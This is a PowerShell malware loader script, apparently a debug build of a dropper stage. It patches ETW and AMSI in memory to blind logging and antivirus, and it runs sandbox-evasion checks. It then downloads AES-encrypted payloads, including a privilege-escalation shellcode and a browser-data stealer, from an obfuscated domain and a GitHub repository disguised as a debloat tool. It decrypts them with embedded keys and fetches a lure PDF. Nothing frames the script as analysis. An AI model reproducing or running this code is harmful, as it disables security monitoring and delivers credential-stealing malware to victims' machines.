# === STAGE V6 DEBUG v2 -- ASCII only, no special chars ===
$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

function _ok($m)  { Write-Host "[+] $m" -ForegroundColor Green }
function _err($m) { Write-Host "[-] $m" -ForegroundColor Red }
function _warn($m){ Write-Host "[!] $m" -ForegroundColor Yellow }
function _info($m){ Write-Host "[*] $m" -ForegroundColor Cyan }

_info "=== STAGE V6 DEBUG v2 ==="
_info "PS Version: $($PSVersionTable.PSVersion)"
_info "CLR: $($PSVersionTable.CLRVersion)"
_info "User: $env:USERNAME | Host: $env:COMPUTERNAME | PID: $pid"

# === STEP 1: Dynamic Kernel32 methods ===
_info "--- STEP 1: Dynamic P/Invoke ---"
try {
    $k='ker';$kb='nel32.dll'
    $Dm=[AppDomain]::CurrentDomain
    $Da=New-Object System.Reflection.AssemblyName('W')
    $Ab=$Dm.DefineDynamicAssembly($Da,[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $Mb=$Ab.DefineDynamicModule('M',$false)
    $Tb=$Mb.DefineType('W','Public,Class')
    $Dll=[System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $Fld=[System.Reflection.FieldInfo[]]@([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
    $Val=[Object[]]@($True)
    $ka=@($k+$kb)
    
    _info "Testing MakeByRefType()..."
    $u32ref=[UInt32].MakeByRefType()
    _ok "MakeByRefType() = $u32ref"
    
    _info "Testing New-Object UIntPtr(6)..."
    $uptr6=New-Object UIntPtr(6)
    _ok "UIntPtr(6) = $uptr6"
    
    _info "Defining methods..."
    $m0=$Tb.DefineMethod('LL','Public,Static',[IntPtr],@([String]))
    $m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
    $m1=$Tb.DefineMethod('GA','Public,Static',[IntPtr],@([IntPtr],[String]))
    $m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
    $m2=$Tb.DefineMethod('VA','Public,Static',[IntPtr],@([IntPtr],[UInt32],[UInt32],[UInt32]))
    $m2.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
    $m3=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],$u32ref))
    $m3.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
    $m4=$Tb.DefineMethod('VF','Public,Static',[bool],@([IntPtr],[UInt32],[UInt32]))
    $m4.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
    $m5=$Tb.DefineMethod('CT','Public,Static',[IntPtr],@([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],$u32ref))
    $m5.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
    $m6=$Tb.DefineMethod('WF','Public,Static',[UInt32],@([IntPtr],[UInt32]))
    $m6.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Fld,$Val)))
    
    _info "Creating type..."
    $W=$Tb.CreateType()
    _ok "Type created: $W"
    _ok "STEP 1: PASS"
} catch {
    _err "STEP 1: FAIL -- $($_.Exception.Message)"
    _err "Line: $($_.InvocationInfo.ScriptLineNumber)"
    exit 1
}

# === STEP 2: ETW Patch ===
_info "--- STEP 2: ETW Patch ---"
try {
    $nd='ntd';$ndb='ll.dll'
    $nt=$W::LL($nd+$ndb)
    if ($nt -eq [IntPtr]::Zero) { _err "LoadLibrary ntdll.dll returned Zero"; throw "ntdll load failed" }
    _ok "ntdll.dll loaded: $nt"
    
    [byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)
    $ew=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
    if ($ew -ne [IntPtr]::Zero) {
        _ok "EtwEventWrite: $ew"
        $o=[UInt32]0;$W::VP($ew,$uptr6,0x40,[ref]$o)|Out-Null
        [Runtime.InteropServices.Marshal]::Copy($p6,0,$ew,6)
        $W::VP($ew,$uptr6,$o,[ref]$o)|Out-Null
        _ok "EtwEventWrite patched"
    } else { _warn "EtwEventWrite not found" }
    
    $ewt=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101+[char]84+[char]114+[char]97+[char]110+[char]115+[char]102+[char]101+[char]114)
    if ($ewt -ne [IntPtr]::Zero) {
        _ok "EtwEventWriteTransfer: $ewt"
        $o=[UInt32]0;$W::VP($ewt,$uptr6,0x40,[ref]$o)|Out-Null
        [Runtime.InteropServices.Marshal]::Copy($p6,0,$ewt,6)
        $W::VP($ewt,$uptr6,$o,[ref]$o)|Out-Null
        _ok "EtwEventWriteTransfer patched"
    } else { _warn "EtwEventWriteTransfer not found" }
    
    _ok "STEP 2: PASS"
} catch {
    _err "STEP 2: FAIL -- $($_.Exception.Message)"
}

# === STEP 3: AMSI Patch ===
_info "--- STEP 3: AMSI Patch ---"
try {
    $ad='ams';$adb='i.dll'
    $am=$W::LL($ad+$adb)
    if ($am -eq [IntPtr]::Zero) { _err "LoadLibrary amsi.dll returned Zero"; throw "amsi load failed" }
    _ok "amsi.dll loaded: $am"
    
    $sb=$W::GA($am,[char]65+[char]109+[char]115+[char]105+[char]83+[char]99+[char]97+[char]110+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114)
    if ($sb -eq [IntPtr]::Zero) { _err "AmsiScanBuffer not found"; throw "AmsiScanBuffer not found" }
    _ok "AmsiScanBuffer: $sb"
    
    [byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)
    $o=[UInt32]0;$W::VP($sb,$uptr6,0x40,[ref]$o)|Out-Null
    [Runtime.InteropServices.Marshal]::Copy($p6,0,$sb,6)
    $W::VP($sb,$uptr6,$o,[ref]$o)|Out-Null
    _ok "AmsiScanBuffer patched"
    _ok "STEP 3: PASS"
} catch {
    _err "STEP 3: FAIL -- $($_.Exception.Message)"
}

# === STEP 4: Sandbox checks ===
_info "--- STEP 4: Sandbox checks ---"
$chkPass=$true
if ($env:USERDOMAIN -eq 'WORKGROUP') { _warn "WORKGROUP detected"; $chkPass=$false }
try {
    $os=Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
    $ramMB=[math]::Round($os.TotalVisibleMemorySize/1024)
    _info "RAM: ${ramMB}MB"
    if ($ramMB -lt 2048) { _warn 'RAM less than 2GB'; $chkPass=$false }
    $uptime=(Get-Date) - $os.LastBootUpTime
    _info "Uptime: $([math]::Round($uptime.TotalMinutes)) min"
    if ($uptime.TotalMinutes -lt 30) { _warn 'Uptime less than 30min'; $chkPass=$false }
} catch { _err "CIM check failed: $($_.Exception.Message)"; $chkPass=$false }
try {
    $cpu=Get-CimInstance Win32_Processor -ErrorAction Stop
    _info "CPU cores: $($cpu.NumberOfLogicalProcessors)"
    if ($cpu.NumberOfLogicalProcessors -lt 2) { _warn 'CPU less than 2 cores'; $chkPass=$false }
} catch {}
if ($chkPass) { _ok "STEP 4: PASS" } else { _warn "STEP 4: Some checks failed" }

# === STEP 5: Admin check ===
_info "--- STEP 5: Admin check ---"
$cbIsAdmin=$false
try { $cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch {}
_info "IsAdmin: $cbIsAdmin"

# === STEP 6: Source connectivity ===
_info "--- STEP 6: Source connectivity ---"
$c1='ht';$c2='tps';$c3='://s';$c4='igni';$c5='ndat';$c6='.com'
$srv=$c1+$c2+$c3+$c4+$c5+$c6
$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
$sources=@($gh, $srv)

foreach ($src in $sources) {
    try {
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('User-Agent','Mozilla/5.0')
        $testUrl="$src/raw/patch.exe.aes"
        $data=$wc.DownloadData($testUrl)
        _ok "$src -- OK ($($data.Length) bytes from patch.exe.aes)"
    } catch {
        _err "$src -- FAIL: $($_.Exception.Message)"
    }
}

# === STEP 7: AES decrypt test ===
_info "--- STEP 7: AES decrypt test ---"
$payloadMode='raw'
$keys=@{
    'raw/patch.exe.aes'              = '3k84C21qJDZQ+sG4Uk7Iyb+29hCgXSP6isHUZb/nb+I8qbd8aqE1eB2qYUZ2BoCM'
    'raw/update.exe.aes'             = 'hnwCGrp/haHk1saCAuy/1T08cAkllwiSPs3Yapgaqu+bmqDA9hGHoH/yfaWuMbwv'
    'raw/ElevatorShellCode.exe.aes'  = '8XuttOXcFiQT+aOlVxneccVpq3mAugc5b7D3caLIVkbiFegb1/cCA2RAyIhtQult'
    'raw/hack-browser-data.exe.aes'  = '8zJ8w9Q7Y04ZaqwZ7LeQT2C6Tw6kSPD2P1nDCFbknRWwVDwzo9hx5D186PdFdjey'
    'raw/wdsr681f3e18.exe.aes'   = 'DuMjhsVdLKzcoRNXm9iSHGnNBLr5EYxu7eATRdJ2oYTb+Gmsb4PWq2e+y6dem5Pi'
    'raw/PatchPulsaar_new.exe.aes'   = 'Zwkz+x/vK+XBhHLuUhyezMXyvlaPJ8xU/xXKoac/qnvdkH4vCpXOfcDGXHNNNA4H'
}

function _dl($remoteName) {
    foreach ($src in $sources) {
        $u="$src/$remoteName"
        try {
            $wc=New-Object Net.WebClient
            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            $d=$wc.DownloadData($u)
            _ok "DL: $remoteName -- $($d.Length) bytes from $src"
            return ,$d
        } catch { _warn "DL: $remoteName -- FAIL from $src" }
    }
    _err "DL: $remoteName -- FAILED ALL SOURCES"
    return $null
}

function _aesDecrypt($encryptedBytes, $keyIVBase64) {
    try {
        $keyIV=[Convert]::FromBase64String($keyIVBase64)
        $key=$keyIV[0..31]
        $iv=$keyIV[32..47]
        $aes=New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Mode=[System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key=$key
        $aes.IV=$iv
        $decryptor=$aes.CreateDecryptor()
        $ms=new-object System.IO.MemoryStream(,$encryptedBytes)
        $cs=new-object System.Security.Cryptography.CryptoStream($ms,$decryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
        $out=new-object System.IO.MemoryStream
        $cs.CopyTo($out)
        $cs.Close();$ms.Close();$aes.Dispose()
        $decrypted=$out.ToArray()
        $out.Close()
        return $decrypted
    } catch {
        _err "AES decrypt: $($_.Exception.Message)"
        return $null
    }
}

# Test first blob
$testName='raw/patch.exe.aes'
$encBytes=_dl $testName
if ($encBytes) {
    $keyIV=$keys[$testName]
    $shellcode=_aesDecrypt $encBytes $keyIV
    if ($shellcode) {
        _ok "AES decrypt OK: $($shellcode.Length) bytes"
        _ok "STEP 7: PASS"
    } else {
        _err "STEP 7: AES decrypt FAILED"
    }
} else {
    _err "STEP 7: Download FAILED"
}

# === STEP 8: Full payload test (no injection) ===
_info "--- STEP 8: Payload download test (no exec) ---"
$payloads=@(
    'ElevatorShellCode.exe.aes',
    'update.exe.aes',
    'patch.exe.aes',
    'PatchPulsaar_new.exe.aes',
    'hack-browser-data.exe.aes',
    'wdsr681f3e18.exe.aes'
)

foreach ($p in $payloads) {
    $fullName="raw/$p"
    $encBytes=_dl $fullName
    if ($encBytes) {
        $keyIV=$keys[$fullName]
        if ($keyIV) {
            $sc=_aesDecrypt $encBytes $keyIV
            if ($sc) {
                $scLen=$sc.Length
                _ok "$p -- OK ($scLen bytes decrypted)"
            } else {
                _err "$p -- DECRYPT FAILED"
            }
        } else {
            _err "$p -- KEY NOT FOUND"
        }
    } else {
        _err "$p -- DOWNLOAD FAILED"
    }
}

# === STEP 9: PDF test ===
_info "--- STEP 9: PDF download test ---"
$pdf1='Rate';$pdf2='_Confirmation';$pdf3='_LD-2026-0847';$pdf4='.pdf'
$pdfName=$pdf1+$pdf2+$pdf3+$pdf4
$pdfBytes=_dl $pdfName
if ($pdfBytes) {
    _ok "PDF: $($pdfBytes.Length) bytes"
} else {
    _err "PDF: DOWNLOAD FAILED"
}

_info "=== DEBUG COMPLETE ==="
_info "Check output above for FAIL lines"
